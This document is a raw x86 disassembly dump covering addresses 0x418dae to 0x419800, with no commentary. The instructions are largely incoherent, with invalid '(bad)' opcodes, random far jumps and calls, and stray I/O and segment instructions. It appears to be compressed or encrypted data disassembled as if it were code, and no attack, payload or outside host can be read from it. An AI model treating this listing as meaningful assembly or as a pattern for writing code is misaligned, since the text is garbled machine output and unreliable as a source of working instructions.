  418dae:	je     0x418d44
  418db0:	jb     0x418d8f
  418db2:	jmp    0x9282171e
  418db7:	sub    al,0xbb
  418db9:	(bad)  
  418dbb:	push   edi
  418dbc:	dec    edx
  418dbd:	sub    BYTE PTR [ecx],bh
  418dbf:	push   eax
  418dc0:	xor    al,ah
  418dc2:	or     BYTE PTR [ebx],dh
  418dc4:	pop    eax
  418dc5:	gs hlt 
  418dc7:	sub    DWORD PTR [esi+0x53],edx
  418dca:	mov    edx,0x1c762188
  418dcf:	mov    dl,0xcf
  418dd1:	retf   
  418dd2:	mov    ds:0x34c5d70a,al
  418dd7:	jmp    0x418dff
  418dd9:	fild   WORD PTR [edx-0x7f700228]
  418ddf:	sbb    DWORD PTR [esi],0xffffffec
  418de2:	or     al,0xe9
  418de4:	inc    eax
  418de5:	adc    al,0xb2
  418de7:	retf   0x5022
  418dea:	mov    eax,0x842f64e2
  418def:	dec    ebx
  418df0:	pop    eax
  418df1:	fs pop ebx
  418df3:	pop    esi
  418df4:	inc    eax
  418df5:	inc    esp
  418df6:	xchg   esp,eax
  418df7:	shl    DWORD PTR [ebx],1
  418df9:	adc    al,0xcb
  418dfb:	pop    ss
  418dfc:	retf   0x186d
  418dff:	leave  
  418e00:	test   eax,edx
  418e02:	int    0x13
  418e04:	fstp   DWORD PTR [edx-0x1c]
  418e07:	xor    DWORD PTR [esi+0x4c43f85c],eax
  418e0d:	jecxz  0x418dcc
  418e0f:	mov    ch,0x82
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x22]
  418e81:	je     0x418e9a
  418e83:	addr16 in eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x69000001
  418e8d:	(bad)  
  418e8e:	jb     0x418e9e
  418e90:	xchg   BYTE PTR [edx-0xcdf9044],bh
  418e96:	(bad)  
  418e97:	(bad)  
  418e99:	push   ss
  418e9a:	int3   
  418e9b:	inc    eax
  418e9c:	popf   
  418e9d:	mov    BYTE PTR [edx],ch
  418e9f:	(bad)  
  418ea0:	sub    ecx,DWORD PTR [ebp+0x71e75b27]
  418ea6:	aaa    
  418ea7:	xchg   BYTE PTR [edi+0x3e],cl
  418eaa:	mov    WORD PTR [esi+0x2fe325a],es
  418eb0:	and    ebx,ebx
  418eb2:	push   ds
  418eb3:	ja     0x418f02
  418eb5:	ins    BYTE PTR es:[edi],dx
  418eb6:	imul   ecx,edx,0xd79c423e
  418ebc:	sub    bl,BYTE PTR [esp+ebx*2+0x79257d00]
  418ec3:	ret    
  418ec4:	and    esi,ebp
  418ec6:	scas   al,BYTE PTR es:[edi]
  418ec7:	cld    
  418ec8:	adc    cl,BYTE PTR [esi+0x72]
  418ecb:	or     DWORD PTR [ebx+0x3],esp
  418ece:	or     BYTE PTR [ebx+eiz*2],bl
  418ed1:	cmp    ebx,esp
  418ed3:	fldenv [ebx+0x47]
  418ed6:	push   ds
  418ed7:	jmp    0x418e9f
  418ed9:	rcr    DWORD PTR [edi+edx*1],cl
  418edc:	add    eax,0x48b5a808
  418ee1:	jnp    0x418f34
  418ee3:	loopne 0x418e98
  418ee5:	daa    
  418ee6:	adc    BYTE PTR [esi+0xac9d1ae],cl
  418eec:	cs clc 
  418eee:	jnp    0x418ea8
  418ef0:	adc    al,0xcb
  418ef2:	mov    ds:0xd8aafede,eax
  418ef7:	fsubr  st,st(6)
  418ef9:	xchg   sp,ax
  418efb:	jg     0x418f6e
  418efd:	jecxz  0x418ed7
  418eff:	add    DWORD PTR [ebp+edi*4-0x2dc4e3a6],0x7917425b
  418f0a:	jg     0x418f4a
  418f0c:	mov    eax,ds:0x40dc0978
  418f11:	mov    edx,DWORD PTR ds:0xe3e6662b
  418f17:	mov    ch,0x9a
  418f19:	rcl    DWORD PTR [edx+ebx*4+0x78],1
  418f1d:	dec    ecx
  418f1e:	sbb    ah,BYTE PTR [eax+0x7e88bce6]
  418f24:	fwait
  418f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f26:	mov    ebx,0x8dec91ef
  418f2b:	add    ecx,DWORD PTR [ebp-0x3c]
  418f2e:	and    al,0x90
  418f30:	cdq    
  418f31:	imul   ebx,DWORD PTR [ebx-0x1e],0x3191c761
  418f38:	inc    esp
  418f39:	fst    QWORD PTR [edx-0x5d]
  418f3c:	sbb    BYTE PTR [eax+0x726d5514],dh
  418f42:	jg     0x418f01
  418f44:	sbb    DWORD PTR [esi+0x7cb5e180],eax
  418f4a:	jmp    0x418f98
  418f4c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  418f4e:	pop    ebp
  418f4f:	inc    esi
  418f50:	mov    ecx,0xbe71531d
  418f55:	add    al,0xe8
  418f57:	push   eax
  418f58:	sbb    edx,esp
  418f5a:	jae    0x418f12
  418f5c:	jmp    0x537cfbd1
  418f61:	mov    ebx,0x6e55b55d
  418f66:	popf   
  418f67:	xchg   esi,eax
  418f68:	sahf   
  418f69:	aam    0xb6
  418f6b:	add    BYTE PTR [edi+0x43489c49],dl
  418f71:	xchg   BYTE PTR [ebx],bh
  418f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f74:	adc    eax,0xf50427ad
  418f79:	and    DWORD PTR [ebp+0x59],ebx
  418f7c:	lds    esi,FWORD PTR [eax+eiz*2]
  418f7f:	ins    DWORD PTR es:[edi],dx
  418f80:	cmp    eax,DWORD PTR [edi+0x40]
  418f83:	fmul   DWORD PTR [edx]
  418f85:	dec    edx
  418f86:	jae    0x418fd8
  418f88:	je     0x418f20
  418f8a:	mov    esp,0xca4876fd
  418f8f:	xchg   ch,dl
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x7b150e59]
  419001:	jo     0x418ff6
  419003:	adc    al,0xea
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x29000001,al
  41900d:	adc    cl,BYTE PTR [eax-0x60e17b74]
  419013:	adc    DWORD PTR [esi+0x56],ecx
  419016:	stos   DWORD PTR es:[edi],eax
  419017:	mov    eax,0xca365cb5
  41901c:	lods   eax,DWORD PTR ds:[esi]
  41901d:	mov    ds,ecx
  41901f:	data16 mov bh,BYTE PTR [edi+0x4b]
  419023:	push   esi
  419024:	out    0x42,ax
  419027:	fucomi st,st(3)
  41902a:	je     0x418faf
  41902c:	loope  0x4190a9
  41902e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41902f:	and    BYTE PTR [ebx-0x124a2132],dl
  419035:	and    esp,esp
  419037:	xchg   ebp,eax
  419038:	adc    cl,dl
  41903a:	cdq    
  41903b:	out    dx,al
  41903c:	mov    esp,0x9ac0bb9f
  419041:	push   0xc6b42776
  419046:	bound  eax,QWORD PTR [ebx+0x3e8bba59]
  41904c:	test   al,0x78
  41904e:	dec    esp
  41904f:	loop   0x41905d
  419051:	dec    ebx
  419052:	xchg   DWORD PTR [edx+0x21],ecx
  419055:	out    0xa7,al
  419057:	out    dx,al
  419058:	inc    edx
  419059:	aas    
  41905a:	(bad)  
  41905b:	idiv   DWORD PTR [ebx+edx*4-0x19]
  41905f:	xchg   esp,eax
  419060:	sbb    edi,DWORD PTR ds:0xc64c4b65
  419066:	fwait
  419067:	jle    0x41904b
  419069:	retf   
  41906a:	push   edi
  41906b:	cmp    esp,DWORD PTR [esi+0x26]
  41906e:	xor    al,0xef
  419070:	mov    ecx,0x3c9d8722
  419075:	fcmovnb st,st(0)
  419077:	xor    DWORD PTR [eax+0x3a],0x29b06ee1
  41907e:	mov    ah,BYTE PTR [edi-0x39]
  419081:	mov    ds:0x2f057675,al
  419086:	mov    dh,0x8e
  419088:	bound  eax,QWORD PTR [ecx]
  41908a:	pop    edi
  41908b:	rcl    DWORD PTR [ebp-0x62],1
  41908e:	adc    DWORD PTR [edx*2+0x11f34663],esp
  419095:	loope  0x4190c3
  419097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419098:	ret    0x2711
  41909b:	add    al,0x7d
  41909d:	(bad)  
  41909e:	dec    edx
  41909f:	(bad)  
  4190a0:	push   eax
  4190a1:	(bad)  
  4190a2:	clc    
  4190a3:	cmp    BYTE PTR [edx],0xde
  4190a6:	loopne 0x419106
  4190a8:	neg    DWORD PTR [ebx-0x27]
  4190ab:	js     0x4190a4
  4190ad:	cmp    eax,0x44765d09
  4190b2:	cli    
  4190b3:	adc    DWORD PTR [edx],esp
  4190b5:	mov    WORD PTR [ecx],es
  4190b7:	add    ah,bh
  4190b9:	pop    ds
  4190ba:	cmp    dh,BYTE PTR ds:[ecx]
  4190bd:	xchg   ebx,eax
  4190be:	fdiv   st(3),st
  4190c0:	fst    DWORD PTR [edx-0x39a6bfe3]
  4190c6:	adc    DWORD PTR [edx],edx
  4190c8:	push   0xffffffc6
  4190ca:	out    0x62,al
  4190cc:	xchg   edi,eax
  4190cd:	repz (bad) 
  4190cf:	fsub   QWORD PTR [ecx]
  4190d1:	jmp    0xc959:0x239c19f9
  4190d8:	scas   eax,DWORD PTR es:[edi]
  4190d9:	aas    
  4190da:	jmp    0x41907d
  4190dc:	(bad)  
  4190de:	out    0xf,al
  4190e0:	test   eax,0x96382be5
  4190e5:	pop    ebp
  4190e6:	sar    DWORD PTR [edi-0x3f8a4dca],1
  4190ec:	push   0x5a
  4190ee:	stos   BYTE PTR es:[edi],al
  4190ef:	jg     0x4190da
  4190f1:	sub    bl,BYTE PTR [ecx]
  4190f3:	or     DWORD PTR [esi-0x5],edx
  4190f6:	cmc    
  4190f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190f8:	aaa    
  4190f9:	jl     0x4190fe
  4190fb:	std    
  4190fc:	mov    esp,0x83a942cf
  419101:	mov    dh,0xca
  419103:	mov    bh,0xb5
  419105:	sbb    al,BYTE PTR [ebx+0x67871d1b]
  41910b:	push   esi
  41910c:	inc    eax
  41910d:	leave  
  41910e:	jge    0x41913e
  419110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     al,BYTE PTR [ebp+0x53]
  419182:	add    eax,0x109ef79
  419187:	add    BYTE PTR ds:0x21000001,al
  41918d:	pop    esp
  41918e:	jns    0x4191e8
  419190:	dec    ebx
  419191:	call   0x26fd325c
  419196:	sbb    al,0x4b
  419198:	js     0x419173
  41919a:	cli    
  41919b:	imul   esp,eax,0xe9eb8c0e
  4191a1:	add    BYTE PTR [eax+0x3f],bh
  4191a4:	and    eax,0xfa85b34b
  4191a9:	dec    ecx
  4191aa:	xor    DWORD PTR [edi+edi*4+0x6c84d97b],edx
  4191b1:	scas   al,BYTE PTR es:[edi]
  4191b2:	pop    esp
  4191b3:	(bad)  
  4191b4:	fldenv ds:0xaa95fd6b
  4191ba:	pushf  
  4191bb:	sub    al,0xc8
  4191bd:	xchg   esi,eax
  4191be:	xor    ebp,DWORD PTR [ebx]
  4191c0:	mov    cl,0xf7
  4191c2:	jbe    0x4191ea
  4191c4:	mov    dh,0x71
  4191c6:	pop    ds
  4191c7:	mov    esi,DWORD PTR [ebx]
  4191c9:	dec    ebx
  4191ca:	xor    edi,ebx
  4191cc:	mov    ebx,0x423060b1
  4191d1:	jecxz  0x419220
  4191d3:	pop    DWORD PTR [eax-0x5d00f009]
  4191d9:	bound  eax,QWORD PTR [ebp-0x235ebe4d]
  4191df:	(bad)  
  4191e0:	jae    0x4191c4
  4191e2:	xlat   BYTE PTR ds:[ebx]
  4191e3:	mov    esi,0xacdc77c6
  4191e8:	ins    DWORD PTR es:[edi],dx
  4191e9:	push   0xffffffc7
  4191eb:	mov    dh,0x5a
  4191ed:	push   ecx
  4191ee:	lods   al,BYTE PTR ds:[esi]
  4191ef:	mov    ah,BYTE PTR [esi+ebx*1-0x59]
  4191f3:	aas    
  4191f4:	int3   
  4191f5:	mov    DWORD PTR [ecx],esi
  4191f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191f8:	test   al,0xe3
  4191fa:	inc    edi
  4191fb:	or     DWORD PTR [esi-0x7d],edx
  4191fe:	imul   esp,esi,0x9bac6c26
  419204:	cmp    al,0xfa
  419206:	mov    ebp,0x848d2885
  41920b:	push   ss
  41920c:	outs   dx,DWORD PTR ds:[esi]
  41920d:	dec    ecx
  41920e:	inc    esp
  41920f:	cs inc edi
  419211:	test   DWORD PTR [edi],esp
  419213:	(bad)  
  419214:	out    0x57,eax
  419216:	lds    esp,FWORD PTR [ebx+0x25]
  419219:	push   ecx
  41921a:	pop    ss
  41921b:	lock jno 0x4191a9
  41921e:	add    BYTE PTR [ebp+0x54],0xbf
  419222:	je     0x419260
  419224:	dec    ebx
  419225:	or     al,0x92
  419227:	adc    bl,ah
  419229:	aaa    
  41922a:	cs push cs
  41922c:	and    eax,edi
  41922e:	js     0x419295
  419230:	js     0x41920d
  419232:	enter  0x7ed0,0xf0
  419236:	lea    esi,[edi]
  419238:	xor    eax,0x84040e13
  41923d:	dec    esi
  41923e:	jge    0x419277
  419240:	push   ebp
  419241:	add    ch,BYTE PTR [esi]
  419243:	sbb    eax,0x381a3e2b
  419248:	jne    0x419274
  41924a:	int3   
  41924b:	push   cs
  41924c:	mov    edi,DWORD PTR [edi-0x7140206a]
  419252:	cli    
  419253:	fist   DWORD PTR [ebx+0x1ad521e7]
  419259:	retf   
  41925a:	js     0x419202
  41925c:	pop    edx
  41925d:	cmp    al,0x2a
  41925f:	add    eax,0x70864549
  419264:	ss push ebp
  419266:	ds call 0x52de:0x6e24073e
  41926e:	mov    ch,0xef
  419270:	out    dx,al
  419271:	shl    BYTE PTR [edi],0x24
  419274:	or     DWORD PTR [eax-0x27],ebp
  419277:	int3   
  419278:	gs xchg esp,eax
  41927a:	pop    eax
  41927b:	jl     0x4192d7
  41927d:	jmp    0x41926b
  41927f:	outs   dx,BYTE PTR ds:[esi]
  419280:	fwait
  419281:	sbb    ebx,0xffffff81
  419284:	cld    
  419285:	je     0x41922a
  419287:	adc    dh,BYTE PTR [ebx-0x8]
  41928a:	pop    edx
  41928b:	imul   ebx,edx,0x63
  41928e:	jmp    DWORD PTR [edi+0x54]
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	mov    ds:0xf44b32f4,al
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x3a000001,al
  41930d:	daa    
  41930e:	sub    ecx,DWORD PTR [edx+ebx*4+0x1c10683b]
  419315:	loop   0x4192cb
  419317:	xchg   edx,eax
  419318:	mov    dh,cl
  41931a:	dec    ebx
  41931b:	std    
  41931c:	stc    
  41931d:	cwde   
  41931e:	jbe    0x4192c8
  419320:	cmc    
  419321:	xchg   ecx,eax
  419322:	xchg   edi,eax
  419323:	xchg   ebx,eax
  419324:	out    0x3c,eax
  419326:	test   eax,0x64df913f
  41932b:	and    cl,BYTE PTR [edi]
  41932d:	xchg   ebp,eax
  41932e:	sbb    ecx,0x1a
  419331:	mov    bl,0xd6
  419333:	into   
  419334:	pslld  mm4,mm1
  419337:	mov    edx,0x2b96e522
  41933c:	(bad)  
  41933d:	cmp    al,0x3d
  41933f:	je     0x419396
  419341:	dec    edx
  419342:	(bad)  
  419343:	adc    bh,dl
  419345:	xor    bl,BYTE PTR [eax+0x22]
  419348:	test   BYTE PTR [edx],dl
  41934a:	and    DWORD PTR [edx+0x23c43d87],ebp
  419350:	in     al,0x2c
  419352:	test   DWORD PTR [ecx],esi
  419354:	mov    ebp,0x4768dccd
  419359:	push   0xffffff9e
  41935b:	(bad)  
  41935c:	push   cs
  41935d:	jecxz  0x4193b8
  41935f:	adc    ebp,DWORD PTR [esi+0x69082f7]
  419365:	xchg   ecx,eax
  419366:	idiv   cl
  419368:	push   eax
  419369:	xlat   BYTE PTR ds:[ebx]
  41936a:	repnz mov cl,0x78
  41936d:	mov    eax,0xd3c1aa37
  419372:	outs   dx,DWORD PTR ds:[esi]
  419373:	mov    edx,0x81ee161c
  419378:	les    edx,FWORD PTR [edx]
  41937a:	cmp    eax,0xb900c99f
  41937f:	sahf   
  419380:	sahf   
  419381:	jns    0x41932e
  419383:	lods   al,BYTE PTR ds:[esi]
  419384:	mov    bl,0x32
  419386:	ret    
  419387:	pop    edx
  419388:	sbb    ah,BYTE PTR [ecx+edi*2-0x1f2cd072]
  41938f:	fsubr  QWORD PTR [ebp-0x74]
  419392:	int3   
  419393:	jb     0x419408
  419395:	inc    edi
  419396:	pushf  
  419397:	sahf   
  419398:	mov    dl,0xc8
  41939a:	aad    0x24
  41939c:	xchg   esp,eax
  41939d:	inc    eax
  41939e:	mov    ds:0x62401faf,al
  4193a3:	dec    ebx
  4193a4:	push   ebp
  4193a5:	mov    ah,0xba
  4193a7:	pushf  
  4193a8:	jecxz  0x41937c
  4193aa:	ret    
  4193ab:	xor    BYTE PTR [eax+ebx*8],bh
  4193ae:	lock int3 
  4193b0:	or     eax,0x36c6ad10
  4193b5:	pop    esp
  4193b6:	hlt    
  4193b7:	call   0xa5bb:0x4b3c97a1
  4193be:	push   eax
  4193bf:	shr    DWORD PTR [esi+0x155ee577],cl
  4193c5:	jnp    0x4193a0
  4193c7:	push   ebp
  4193c8:	mov    edx,0x9caf274e
  4193cd:	mov    al,ds:0xb94b0445
  4193d2:	inc    ecx
  4193d3:	and    al,0x47
  4193d5:	test   bh,cl
  4193d7:	imul   dl
  4193d9:	leave  
  4193da:	leave  
  4193db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193dc:	fwait
  4193dd:	stc    
  4193de:	in     eax,0x1a
  4193e0:	aam    0xc6
  4193e2:	xor    bl,BYTE PTR [ebx]
  4193e4:	stos   DWORD PTR es:[edi],eax
  4193e5:	mov    dl,0xef
  4193e7:	sbb    al,0x84
  4193e9:	mov    ah,0xcb
  4193eb:	cmp    al,0x43
  4193ee:	rcl    BYTE PTR [edi-0x5540b1fb],1
  4193f4:	repz dec esp
  4193f6:	jmp    0x419381
  4193f8:	pusha  
  4193f9:	out    dx,eax
  4193fa:	jg     0x419479
  4193fc:	retf   
  4193fd:	dec    eax
  4193fe:	pop    esi
  4193ff:	lods   al,BYTE PTR ds:[esi]
  419400:	push   0xffffffa8
  419402:	into   
  419403:	mov    ebp,0xb216c25a
  419408:	xchg   esp,eax
  419409:	ins    BYTE PTR es:[edi],dx
  41940a:	fwait
  41940b:	jae    0x41941a
  41940d:	mov    dl,0xa5
  41940f:	mov    ch,0x6d
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	jecxz  0x419461
  419482:	push   0x15
  419484:	stc    
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0xff000001,al
  41948d:	retf   
  41948e:	out    0x83,al
  419490:	dec    ebx
  419491:	push   ebx
  419492:	call   0x995d:0xedc110f8
  419499:	add    al,0xc9
  41949b:	or     edi,ebx
  41949d:	fstp   QWORD PTR [ecx]
  41949f:	pusha  
  4194a0:	push   edx
  4194a1:	push   esi
  4194a2:	call   0xbba64bea
  4194a7:	cdq    
  4194a8:	je     0x4194c7
  4194aa:	in     eax,0x86
  4194ac:	xchg   ebx,eax
  4194ad:	fdiv   QWORD PTR [edx]
  4194af:	mov    ah,BYTE PTR [esi-0x7c]
  4194b2:	lods   al,BYTE PTR ds:[esi]
  4194b3:	cld    
  4194b4:	ret    
  4194b5:	scas   eax,DWORD PTR es:[edi]
  4194b6:	stc    
  4194b7:	out    0x1a,al
  4194b9:	cmp    ecx,DWORD PTR [edx]
  4194bb:	test   BYTE PTR ds:0x48e2af1d,cl
  4194c1:	or     al,bl
  4194c3:	rcl    DWORD PTR [ebp+0xd],0x21
  4194c7:	call   0x7f9b:0x78fbabf1
  4194ce:	shl    DWORD PTR [esi],0xcb
  4194d1:	sub    BYTE PTR [ebp+0x3a],0x4c
  4194d5:	xor    ah,0x7d
  4194d8:	mov    edi,0xef995e26
  4194dd:	mov    ebx,DWORD PTR ss:[esi]
  4194e0:	das    
  4194e1:	bound  ebx,QWORD PTR [edi-0x3ca5beb8]
  4194e7:	add    BYTE PTR [ebx+edx*8],bl
  4194ea:	inc    esi
  4194eb:	stos   BYTE PTR es:[edi],al
  4194ec:	sti    
  4194ed:	cwde   
  4194ee:	sahf   
  4194ef:	stos   BYTE PTR es:[edi],al
  4194f0:	and    DWORD PTR [edx+0x22116a0],edx
  4194f6:	jmp    0x6559:0x904816a3
  4194fd:	or     edi,edi
  4194ff:	daa    
  419500:	jo     0x419555
  419502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419503:	pop    esi
  419504:	jbe    0x419573
  419506:	not    DWORD PTR [edi-0x598e244f]
  41950c:	dec    edx
  41950d:	or     BYTE PTR ds:0xe8fa8b1e,dh
  419513:	xchg   edi,eax
  419514:	inc    esi
  419515:	xchg   ecx,eax
  419516:	push   ecx
  419517:	setle  BYTE PTR ds:0xd251e137
  41951e:	bound  edx,QWORD PTR [edi+0x2d86e932]
  419524:	xchg   ecx,eax
  419525:	mov    ebx,0x45367882
  41952a:	test   al,0x7f
  41952c:	js     0x41951d
  41952e:	retf   
  41952f:	pop    eax
  419530:	rcl    BYTE PTR [esi+0x74],1
  419533:	sub    eax,esi
  419535:	push   cs
  419536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419537:	loopne 0x4194e9
  419539:	and    eax,0x108d7f12
  41953e:	ja     0x4194fa
  419540:	mov    ebx,0x8649ba9f
  419545:	stc    
  419546:	jo     0x419546
  419548:	lock or BYTE PTR [ebx],bl
  41954b:	inc    edi
  41954c:	imul   eax,DWORD PTR [edx],0xfffffff7
  41954f:	push   0xffffffa0
  419551:	and    al,0x11
  419553:	(bad)  
  419554:	sub    eax,0xbc3f53d5
  419559:	and    dl,BYTE PTR [ecx-0x5e]
  41955c:	cmp    eax,0xcb2e738b
  419561:	inc    esi
  419562:	cli    
  419563:	and    eax,0x4fba3d4a
  419568:	data16 stos BYTE PTR es:[edi],al
  41956a:	cmp    bl,BYTE PTR [eax+0x5859a17b]
  419570:	cmp    BYTE PTR [ecx],ah
  419572:	sub    esi,DWORD PTR [ebx+0x25]
  419575:	push   0xa2352338
  41957a:	aad    0x33
  41957c:	sub    esp,DWORD PTR [ecx]
  41957e:	js     0x419584
  419580:	mov    ecx,DWORD PTR [ecx+0x4c1c8674]
  419586:	mov    dh,bl
  419588:	rcl    DWORD PTR [ecx],1
  41958a:	in     al,0xa8
  41958c:	cmc    
  41958d:	fmul   QWORD PTR [ebx+0x5b]
  419590:	or     al,0x0
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	cld    
  419601:	mov    bl,0x5
  419603:	pop    es
  419604:	dec    BYTE PTR [ecx+eax*1]
  419607:	add    BYTE PTR ds:0xc7000001,al
  41960d:	mov    bl,0xe6
  41960f:	icebp  
  419610:	push   cs
  419611:	pop    edi
  419612:	enter  0x6b96,0x88
  419616:	cmc    
  419617:	mov    eax,ds:0x32cdec27
  41961c:	ins    DWORD PTR es:[edi],dx
  41961d:	and    DWORD PTR [edi+0x29b6f5cb],0x92a24c59
  419627:	cmp    dl,BYTE PTR [esi+eax*1+0x2dbc292a]
  41962e:	cld    
  41962f:	xor    eax,0x8c6f4fa8
  419634:	adc    BYTE PTR [ecx-0x2c],bh
  419637:	scas   al,BYTE PTR es:[edi]
  419638:	xchg   edx,eax
  419639:	cmp    edi,DWORD PTR [ebx-0x6d34fa14]
  41963f:	cdq    
  419640:	lea    ebp,[edx+0x5]
  419643:	xchg   BYTE PTR [ecx],cl
  419645:	and    ecx,DWORD PTR [ebx+0x2a0141c7]
  41964b:	out    0x69,al
  41964d:	sub    DWORD PTR [ecx+0x4fda570b],esp
  419653:	dec    ecx
  419654:	cld    
  419655:	push   0xee9a4858
  41965a:	dec    esi
  41965b:	fiadd  DWORD PTR [ebp-0x457132af]
  419661:	mov    ebx,0xf68d2c86
  419666:	cmc    
  419667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419668:	xor    BYTE PTR [edi-0x13ef9e3e],ch
  41966e:	mul    DWORD PTR [esi+0x6c]
  419671:	push   es
  419672:	jne    0x41962c
  419674:	cmp    DWORD PTR [ebx+0x71f887a0],ebp
  41967a:	add    DWORD PTR [eax+0x65],ebp
  41967d:	lahf   
  41967e:	cmp    DWORD PTR [edx-0x3e],ebx
  419681:	les    eax,FWORD PTR [ebx+0x34]
  419684:	in     eax,0xcc
  419686:	je     0x4196d7
  419688:	push   edi
  419689:	out    0x82,eax
  41968b:	lds    ebp,FWORD PTR [edx]
  41968d:	push   ebx
  41968e:	js     0x4196ec
  419690:	mov    DWORD PTR [edi+edx*8+0x9b15a20],esp
  419697:	aam    0x97
  419699:	popa   
  41969a:	aaa    
  41969b:	jbe    0x419669
  41969d:	add    eax,0x65a7d869
  4196a2:	lods   al,BYTE PTR ss:[esi]
  4196a4:	dec    esi
  4196a5:	mov    cl,0xfa
  4196a7:	sub    BYTE PTR [ebx],dl
  4196a9:	rcr    DWORD PTR [ebp+0x114e4229],0x67
  4196b0:	popf   
  4196b1:	sub    esi,eax
  4196b3:	push   esi
  4196b4:	pop    ebp
  4196b5:	or     ch,cl
  4196b7:	cmp    DWORD PTR [ecx-0x22],ecx
  4196ba:	sub    al,0x6c
  4196bc:	scas   eax,DWORD PTR es:[edi]
  4196bd:	inc    edi
  4196be:	push   ebx
  4196bf:	cmc    
  4196c0:	test   DWORD PTR [ebp+ebp*2-0x57],0xdc43bf07
  4196c8:	add    bh,BYTE PTR [ebp+0x7f2e79f4]
  4196ce:	jl     0x41965b
  4196d0:	aaa    
  4196d1:	mov    cl,BYTE PTR [edi+esi*8]
  4196d4:	xchg   edi,eax
  4196d5:	adc    BYTE PTR [ebp-0x47ae457],cl
  4196db:	aam    0x0
  4196dd:	das    
  4196de:	mov    al,0x9a
  4196e0:	push   0xdc7be06d
  4196e5:	test   eax,0x8236eb39
  4196ea:	lock and ah,BYTE PTR [edx]
  4196ed:	int    0x1f
  4196ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f0:	push   0xc6d53751
  4196f5:	sbb    ecx,DWORD PTR [eax+eax*2+0x39d95041]
  4196fc:	dec    ebx
  4196fd:	push   0xffffff8b
  4196ff:	and    ebp,DWORD PTR [esi-0x19bd9c26]
  419705:	std    
  419706:	adc    esi,DWORD PTR [ebp+0x45]
  419709:	mov    ebx,0xb6508fa
  41970e:	pop    eax
  41970f:	ja     0x4196a6
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xf98dd0ae
  419781:	mov    BYTE PTR ds:0x10e03ab,dl
  419787:	add    BYTE PTR ds:0x52000001,al
  41978d:	pop    edx
  41978e:	adc    eax,0xb385efe3
  419793:	call   0x7e6f165b
  419798:	imul   esp,DWORD PTR [ecx],0xe2de4a0f
  41979e:	mov    ch,dh
  4197a0:	imul   ecx,edx,0xffffffef
  4197a3:	sub    BYTE PTR [edx-0xa],0xe0
  4197a7:	cmp    eax,0xdeff9786
  4197ac:	xor    BYTE PTR [ebx+0x6c4f2e41],bh
  4197b2:	jbe    0x419743
  4197b4:	xchg   eax,ebx
  4197b6:	sub    BYTE PTR [ecx+0x58],ch
  4197b9:	dec    esi
  4197ba:	scas   al,BYTE PTR es:[edi]
  4197bb:	jle    0x41976c
  4197bd:	stos   DWORD PTR es:[edi],eax
  4197be:	sti    
  4197bf:	frstor [edx-0x5a]
  4197c2:	inc    ebx
  4197c3:	ds push edx
  4197c5:	push   es
  4197c6:	mov    ebp,0xd7112393
  4197cb:	mov    bl,0x9d
  4197cd:	sti    
  4197ce:	dec    ebp
  4197cf:	adc    ch,0x51
  4197d2:	cdq    
  4197d3:	push   0x31
  4197d5:	out    0x84,al
  4197d7:	lods   eax,DWORD PTR ds:[esi]
  4197d8:	test   al,0xb9
  4197da:	jns    0x419784
  4197dc:	sub    al,0xb
  4197de:	sahf   
  4197df:	pop    eax
  4197e0:	sbb    al,0xf0
  4197e2:	fstp   TBYTE PTR es:[edi-0xd]
  4197e6:	out    0xd5,eax
  4197e8:	lds    ebp,FWORD PTR [edx-0x39]
  4197eb:	xor    DWORD PTR [edx],esp
  4197ed:	cli    
  4197ee:	jl     0x4197ec
  4197f0:	mov    bh,0xf2
  4197f2:	loop   0x419828
  4197f4:	mov    cl,0x77
  4197f6:	pop    esp
  4197f7:	adc    al,0xfd
  4197f9:	push   ebp
  4197fa:	nop
  4197fb:	sar    DWORD PTR [edx+edx*1],cl
  4197fe:	clc    
  4197ff:	lahf   
  419800:	mov    eax,ds:0xaa861d4b
